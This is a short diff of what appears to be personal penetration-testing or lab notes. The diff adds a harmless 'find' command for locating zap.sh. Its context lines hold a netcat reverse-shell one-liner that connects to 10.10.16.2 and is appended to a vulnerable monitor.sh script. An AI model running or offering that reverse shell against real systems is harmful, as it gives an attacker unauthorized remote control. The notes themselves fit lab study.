@@ -93,3 +93,7 @@ reverse shell for exploitation of a vulnerable file.
 ```
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.2 8443 >/tmp/f' | tee -a monitor.sh
 ```
+Used to help find files in the file share:
+```
+find /usr/share/ -name zap.sh
+```
